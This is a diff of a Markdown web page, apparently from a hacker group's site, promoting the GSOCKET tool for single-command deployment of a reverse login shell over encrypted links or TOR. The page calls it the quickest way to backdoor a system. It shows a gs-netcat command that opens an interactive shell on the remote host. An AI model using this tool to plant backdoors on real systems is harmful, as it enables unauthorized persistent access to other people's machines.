@@ -2,7 +2,7 @@
 layout: default
 ---
 
-Deploy a reverse login shell with a single command (fully automated) - and access the shell remotely - encrypted - and via TOR if you like. 
+Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like. 
 
 > _This must be the quickest way to backdoor a system_
 >                                                 -- anonymous
@@ -29,8 +29,11 @@ Access the remote host from anywhere in the world:
 $ gs-netcat -s ExampleSecretChagneMe -i
 ```
 ---
+This is just one example of GSOCKET. Visit the [GitHub Page](https://github.com/hackerschoice/gsocket) for more.  
+
+---
 {:refdef: style="text-align: center;"}
-EXAMPLE
+Screenshots
 {: refdef}
 Install
 {:refdef: style="text-align: center;"}
@@ -41,7 +44,5 @@ Login
 ![Deploy-Login](../assets/images/deploy-login.png)
 {: refdef}
 ---
-Check out our [GitHub Page](https://github.com/hackerschoice/gsocket) for more fun.  
-
 Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).
 
